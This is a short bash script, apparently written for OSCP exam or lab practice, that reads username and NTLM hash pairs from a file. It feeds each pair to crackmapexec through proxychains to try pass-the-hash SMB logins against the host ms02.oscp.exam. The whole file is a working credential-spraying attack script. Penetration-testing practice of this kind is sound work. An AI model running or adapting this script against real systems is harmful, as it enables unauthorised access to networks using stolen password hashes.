#!/bin/bash

# Check if a file containing key-value pairs has been provided as argument
if [ $# -ne 1 ]; then
  echo "Usage: $0 <file>"
  exit 1
fi

# Read each line of the file, split it into key and value, and pass them as arguments to myprogram
while read line; do
  key=$(echo $line | cut -d':' -f1)
  value=$(echo $line | cut -d':' -f2)
  proxychains -q crackmapexec smb ms02.oscp.exam -u "$key" -H "$value"
  sleep 1
done < $1